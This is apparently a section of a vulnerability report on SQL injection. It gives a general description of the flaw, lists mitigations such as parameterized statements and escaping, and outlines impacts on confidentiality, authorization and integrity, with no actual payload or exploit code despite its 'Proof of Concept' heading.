III. PROOF OF CONCEPT***********************
SQL Injection***************************
Vulnerability description----------------------------
SQL injection is a code injection technique, used to attack data driven applications, in which malicious SQL statements are inserted into an entry field for execution (e.g. to dump the database contents to the attacker).
SQL injection must exploit a security vulnerability in an application's software, for example, when user input is either incorrectly filtered for string  literal escape characters embedded in SQL statements or user input is not strongly typed and unexpectedly executed. SQL injection is mostly known as an attack vector for websites but can be used to attack any type of SQL database.

Mitigation----------------------------------
Parameterized statementsEnforcement at the coding levelEscaping

Impact of this vulnerability----------------------------
Confidentiality: Since SQL databases generally hold sensitive data, loss of confidentiality is a frequent problem with SQL Injection vulnerabilities.
Authorization: If authorization information is held in a SQL database, it may be possible to change this information through the successful exploitation of a SQL Injection vulnerability.
Integrity: Just as it may be possible to read sensitive information, it is also possible to make changes or even delete this information with a SQL Injection attack.
